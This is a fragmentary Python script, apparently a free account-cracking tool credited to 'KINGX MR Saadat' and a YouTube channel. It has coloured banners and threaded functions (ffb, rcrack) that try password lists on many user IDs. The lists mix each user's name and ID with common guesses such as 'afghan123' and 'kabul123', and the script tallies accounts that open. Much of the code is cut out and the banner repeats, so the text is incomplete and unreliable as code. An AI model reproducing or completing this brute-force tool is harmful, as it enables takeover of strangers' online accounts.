...
{+}\033[1;32mYOUTUBE        : \033[1;32mSaadat YT\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 0.9\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m FREE\033[1;32m
--------------------------------------------------
\033[1;37m[-]KINGX MR Saadat
--------------------------------------------------""")
def linex():
	print('\033[1;32m--------------------------------------------------')
def clear():
		...
		with tred(max_workers=30) as AXI:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'Afghan123','khan123','786786','100200','500600','1000200']
				else:
					passlist = [psx,ids,'afghan123','afghanistan','kabul123','kabul1234','kabul12345','900900','500500','khan12345']
				if mthd in ['2','02']:
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [Start %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [Start %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
...
{+}\033[1;32mYOUTUBE        : \033[1;32mSaadat\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 0.9\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m FREE\033[1;32m
--------------------------------------------------
